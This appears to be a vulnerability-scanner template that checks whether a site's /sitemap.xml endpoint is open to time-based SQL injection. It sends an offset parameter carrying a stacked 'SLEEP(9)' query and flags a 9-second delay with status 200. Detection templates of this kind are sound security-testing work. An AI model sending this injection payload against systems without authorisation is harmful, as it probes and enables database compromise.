id: sql-injection

info:
  name: Sitemap - SQL Injection
  author: Aravind
  severity: high
  tags: misconfig,sitemap,sqli

http:
  - raw:
      - |
        @timeout: 15s
        POST /sitemap.xml?offset=1;SELECT IF((SLEEP(9)),1,2356)# HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'duration>=9'
          - 'status_code == 200'
        condition: and
